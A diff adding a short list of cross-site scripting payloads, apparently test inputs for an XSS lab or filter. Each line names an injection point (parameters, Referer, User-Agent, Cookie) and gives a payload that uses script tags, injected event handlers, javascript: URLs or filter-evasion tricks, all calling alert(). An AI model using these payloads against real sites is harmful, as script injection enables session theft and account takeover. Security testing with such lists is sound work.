@@ -1,0 +1,15 @@
+Normal:<script>alert(1)</script>
+Prop:x" onclick="alert(2)
+Prop:x' onclick='alert(3)
+Prop:x" onclick="alert(4)
+Prop:x"><a href="javascript:alert(5)">yy</a>
+Prop:x" ONclick="alert(6)
+Double:x" oonnclick="alert(7)
+Escape:javascript:alert(8)
+Prop:x" onclick="alert(10)" type="button
+Referer:x" onclick="alert(11)" type="button
+User-Agent:x" onclick="alert(12)" type="button
+Cookie:user=x" onclick="alert(13)" type="button
+Replace:test<img%0asrc=1%0aonerror=alert(16)>
+Normal:1111 onmouseover=alert(17)
+Normal:1111 onmouseover=alert(18)
